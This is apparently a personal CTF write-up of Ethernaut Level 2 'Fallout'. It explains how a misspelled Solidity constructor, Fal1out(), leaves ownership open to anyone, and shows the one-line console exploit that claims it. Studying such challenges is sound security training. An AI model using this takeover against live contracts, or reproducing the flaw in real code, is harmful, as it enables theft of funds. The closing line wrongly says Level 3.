**Ethernaut Level 2 — Fallout**  
**Introduction**  
**Fallout** is Level 2 of OpenZeppelin's Ethernaut Web3 CTF.  
The main objective of this level is to **become the owner of the contract**.  
At first glance, the contract looks like a simple Ether allocation contract. Most of the functions are just handling deposits, allocations, and transfers. The important part was figuring out how the owner variable was initially set and whether there was a way for me to change it.  
![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAnEAAAACCAYAAAA3pIp+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAANklEQVR4nO3OMQ2AABAAsSNBCkJfFEIwwIgHRiywEZJWQZeZ2ao9AAD+4lyruzq+ngAA8Nr1AOHsBegrsOrIAAAAAElFTkSuQmCC)  
**Objective**  
The objective of this level is to become the owner of the Fallout contract.  
After becoming the owner, the level can be completed by satisfying the ownership requirement.  
![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAnEAAAACCAYAAAA3pIp+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAANElEQVR4nO3OQQmAABRAsSdYxKY/jbnMIJ7FCt5E2BJsmZmt2gMA4C+Otbqr8+sJAACvXQ85TgYRMv3/cwAAAABJRU5ErkJggg==)  
**1. Understanding the Contract**  
I first checked the contract code given in the challenge and went through the functions and modifier to see where the important logic was.  
allocations  
mapping(address => uint256) allocations;  
   
This mapping keeps track of how much Ether has been allocated to each address.  
owner  
address payable public owner;  
   
This stores the current owner of the contract.  
Fal1out()  
function Fal1out() public payable {  
     owner = msg.sender;  
     allocations[owner] = msg.value;  
 }  
   
This was the most important part of the contract.  
At first, it looks like a constructor because it has the same general structure as a constructor from older Solidity versions.  
However, the contract is actually named:  
contract Fallout  
   
while the function is named:  
function Fal1out()  
   
There is a difference in the name: **Fallout** ** uses an ** **l** **, while ** **Fal1out** ** contains the number ** **1**.  
Because of this typo, Fal1out() is not the constructor.  
It is just a normal public payable function that anyone can call.  
Inside the function:  
owner = msg.sender;  
   
the caller becomes the owner.  
So this immediately gave me a possible way to take ownership of the contract.  
onlyOwner  
modifier onlyOwner() {  
     require(msg.sender == owner, "caller is not the owner");  
     _;  
 }  
   
This modifier makes sure that only the current owner can execute functions that use it.  
allocate()  
function allocate() public payable {  
     allocations[msg.sender] = allocations[msg.sender].add(msg.value);  
 }  
   
This function lets a user add Ether to their allocation.  
It is mainly standard bookkeeping for the user's balance.  
sendAllocation()  
function sendAllocation(address payable allocator) public {  
     require(allocations[allocator] > 0);  
     allocator.transfer(allocations[allocator]);  
 }  
   
This function transfers the allocation belonging to the specified address.  
The only requirement is that the selected address has a non-zero allocation.  
collectAllocations()  
function collectAllocations() public onlyOwner {  
     msg.sender.transfer(address(this).balance);  
 }  
   
This transfers the entire balance of the contract to the caller.  
Because it uses the onlyOwner modifier, only the owner can call it.  
allocatorBalance()  
function allocatorBalance(address allocator) public view returns (uint256) {  
     return allocations[allocator];  
 }  
   
This simply returns the allocation stored for a particular address.  
![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAnEAAAACCAYAAAA3pIp+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAANUlEQVR4nO3OQQmAABRAsSd4EKxgBjP+Asa0hxW8ibAl2DIzR3UFAMBf3Gu1VefXEwAAXtsfSqwDVbgKngwAAAAASUVORK5CYII=)  
**2. Inspecting the Contract and ABI**  
After checking the source code, I opened the browser console and typed:  
contract  
   
The console displayed the contract object along with its ABI and the functions that were available to call.  
Among the functions I could see:  
Fallout()  
 allocate()  
 allocatorBalance()  
 collectAllocations()  
 owner()  
 sendAllocation()  
   
This was useful because I could confirm that the suspicious Fal1out() function was exposed through the contract interface.  
![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAnEAAAACCAYAAAA3pIp+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAANklEQVR4nO3OMQ2AABAAsSPBCj5fFgpQwYwEZiywEZJWQZeZ2ao9AAD+4lyruzq+ngAA8Nr1AMTRBeEgNK9YAAAAAElFTkSuQmCC)  
**3. Finding the Ownership Vulnerability**  
The main thing I was looking for was how the owner variable was being set.  
In the code, I found:  
function Fal1out() public payable {  
     owner = msg.sender;  
     allocations[owner] = msg.value;  
 }  
   
Normally, a constructor is executed only when the contract is deployed.  
But this function was declared as:  
public payable  
   
which means it can be called by anyone.  
The reason this happened is the typo in the function name.  
The contract is:  
contract Fallout  
   
but the function is:  
function Fal1out()  
   
The 1 makes the names different.  
Because of that, Solidity treats Fal1out() as a regular function instead of a constructor.  
That means when I call it, this line:  
owner = msg.sender;  
   
sets the owner to my address.  
![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAnEAAAACCAYAAAA3pIp+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAANklEQVR4nO3OQQmAABRAsSeYxZw/lVeDGMACBrCCNxG2BFtmZquOAAD4i3Ot7mr/egIAwGvXA6fOBdd+dKAKAAAAAElFTkSuQmCC)  
**4. Calling **Fal1out()  
Since the ABI showed that the function was available, I called it from the console:  
await contract.Fal1out()  
   
The transaction was successfully submitted.  
Since msg.sender inside Fal1out() is the account that called the function, the following assignment:  
owner = msg.sender;  
   
made my account the new owner.  
The second line:  
allocations[owner] = msg.value;  
   
sets my allocation to the amount of Ether sent with the call.  
Since I didn't need to send Ether to exploit the ownership issue, the important part for this level was the first line:  
owner = msg.sender;  
   
![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAnEAAAACCAYAAAA3pIp+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAANUlEQVR4nO3OMQ2AABAAsSNhQAQ60PcrIhnxgQU2QtIq6DIze3UGAMBf3Gu1VcfXEwAAXrseS14EKxPCORkAAAAASUVORK5CYII=)  
**5. Verifying the Owner**  
After calling Fal1out(), I could check the current owner through the public owner variable.  
I used:  
await contract.owner()  
   
The returned address should match my player address.  
This confirmed that the call to Fal1out() had successfully changed the ownership of the contract.  
![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAnEAAAACCAYAAAA3pIp+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAANklEQVR4nO3OQQmAABRAsSfYxZo/jzlMYQLPJrCCNxG2BFtmZquOAAD4i3Ot7mr/egIAwGvXA4q7Bc870TqdAAAAAElFTkSuQmCC)  
**6. Completing the Level**  
The important part of this level was not the allocation or transfer logic.  
The vulnerability came from an old-style constructor declaration being accidentally written with a typo.  
The contract was named:  
Fallout  
   
but the supposed constructor was:  
Fal1out()  
   
Because the names did not match, the function became publicly callable.  
The complete exploit was simply:  
await contract.Fal1out()  
   
After that, I verified the owner with:  
await contract.owner()  
   
Since my address had become the owner, the ownership condition for the level was satisfied.  
**Level 3 — Completed ✅**  
